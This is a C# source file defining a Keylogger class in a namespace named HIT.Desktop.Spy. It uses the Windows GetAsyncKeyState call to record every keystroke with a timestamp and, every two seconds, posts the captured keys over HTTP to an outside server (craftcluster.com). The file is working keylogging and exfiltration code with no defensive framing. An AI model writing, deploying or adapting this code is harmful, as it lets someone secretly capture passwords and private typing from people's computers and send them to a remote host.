using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Formatting;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using HIT.Web.Infrastructure.Extensions;
using HIT.Web.ViewModels;

namespace HIT.Desktop.Spy
{
    public class Keylogger : IRunnable
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        private readonly string SessionId;
        private bool isRunning;
        private List<string> keysPressedList;
        private readonly Timer timer;

        public Keylogger(string sessionId)
        {
            this.SessionId = sessionId;
            this.isRunning = true;
            this.keysPressedList = new List<string>();

            var dueTime = 2000;
            var period = 2000;
            this.timer = new Timer(async (obj) => { await this.TimerEventHandler(); }, null, dueTime, period);
        }

        public Task Start()
        {
            while (this.isRunning)
            {
                for (Int32 i = 0; i < 255; i++)
                {
                    var keyState = GetAsyncKeyState(i);

                    if (keyState == 1 || keyState == -32767)
                    {
                        var key = (Keys)i;

                        if (key != Keys.LButton && key != Keys.RButton)
                        {
                            this.keysPressedList.Add($"[{DateTime.Now}] - {key}");
                        }
                    }
                }

                Thread.Sleep(10);
            }

            return null;
        }

        public async void Stop()
        {
            this.isRunning = false;
            await this.SendKeysPressedAsync(this.keysPressedList);
        }

        private IList<string> GetDeepCopy(IList<string> list)
        {
            var clonedList = new List<string>(list.Count);

            for (int i = 0; i < list.Count; i++)
            {
                var clonedItem = String.Copy(list[i]);
                clonedList.Add(clonedItem);
            }

            return clonedList;
        }

        private async Task TimerEventHandler()
        {
            if (this.keysPressedList.IsNotNull() && this.keysPressedList.Count > 0)
            {
                var keysToSend = this.GetDeepCopy(this.keysPressedList);
                this.keysPressedList.Clear();

                // REDO THIS CODE, doesnt throw exception, must check what happends
                try
                {
                    await this.SendKeysPressedAsync(keysToSend);
                }
                catch (Exception e)
                {
                    throw;
                }
            }
        }

        private async Task SendKeysPressedAsync(IList<string> data)
        {
            var model = new KeysPressedViewModel
            {
                SessionId = this.SessionId,
                KeysPressedList = data
            };

            using (var client = new HttpClient())
            {
                // Set the API base address
                //client.BaseAddress = new Uri("http://localhost:62164/");
                client.BaseAddress = new Uri("http://craftcluster.com/");

                // Set the Accept header for BSON
                client.DefaultRequestHeaders.Accept.Clear();
                client.DefaultRequestHeaders.Accept.Add(
                    new MediaTypeWithQualityHeaderValue("application/bson"));

                // POST using the BSON formatter
                var bsonFormatter = new BsonMediaTypeFormatter();
                var result = await client.PostAsync("api/Sessions/PostKeysPressed", model, bsonFormatter);

                result.EnsureSuccessStatusCode();
            }
        }
    }
}
